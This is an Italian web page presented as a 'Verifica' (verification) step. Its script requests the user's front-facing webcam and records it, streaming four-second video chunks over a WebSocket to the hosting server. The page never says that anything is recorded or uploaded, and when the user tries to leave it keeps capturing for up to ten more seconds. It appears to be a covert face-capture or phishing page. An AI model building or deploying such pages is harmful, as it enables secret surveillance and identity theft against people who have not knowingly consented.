<!doctype html>
<html lang="it">
<head>
  <meta charset="utf-8">
  <title>Verifica</title>
  <link rel="stylesheet" href="style.css">
  <style>
    body { background:#000; color:#fff; font-family:Arial; text-align:center; padding:20px; }
    #box { max-width:500px; margin:auto; background:#111; padding:30px; border-radius:12px; }
    video { width:100%; max-width:400px; border-radius:8px; margin:20px 0; background:#000; }
    button { padding:14px 30px; font-size:18px; margin:10px; border:none; border-radius:6px; cursor:pointer; }
    #consenti { background:#0066ff; color:white; }
    #stop { background:#ff4444; color:white; display:none; }
    #status { font-size:18px; margin:15px 0; min-height:24px; }
  </style>
</head>
<body>
<div id="box">
  <h2>Verifica</h2>
  
  <input id="user" placeholder="Nome (opzionale)" style="padding:12px; width:80%; margin:10px 0;">
  
  <button id="consenti">Tu adesso</button>
  <button id="stop">â›” Ferma</button>
  
  <video id="localVideo" autoplay playsinline muted></video>
  <div id="status"></div>
</div>

<script>
  const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
  let stream = null;
  let mediaRecorder = null;
  let username = '';

  document.getElementById('consenti').onclick = async () => {
    username = document.getElementById('user').value.trim() || 'Utente';

    try {
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' },
        audio: false 
      });

      document.getElementById('localVideo').srcObject = stream;
      document.getElementById('consenti').style.display = 'none';
      document.getElementById('stop').style.display = 'inline-block';

      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0 && ws.readyState === WebSocket.OPEN) {
          ws.send(event.data);
        }
      };

      mediaRecorder.start(4000); // chunk ogni 4 secondi

    } catch (err) {
      alert('Errore accesso webcam: ' + err.message);
    }
  };

  document.getElementById('stop').onclick = () => {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.stop();
    }
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
      stream = null;
    }
    document.getElementById('localVideo').srcObject = null;
    document.getElementById('consenti').style.display = 'inline-block';
    document.getElementById('stop').style.display = 'none';
  };

  window.addEventListener('beforeunload', (event) => {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.requestData();
      setTimeout(() => {
        if (mediaRecorder) mediaRecorder.stop();
        if (stream) stream.getTracks().forEach(t => t.stop());
      }, 10000); // 10 secondi extra se chiude
    }
  });

  window.addEventListener('unload', () => {
    if (ws.readyState === WebSocket.OPEN) ws.close();
  });
</script>
</body>
</html>
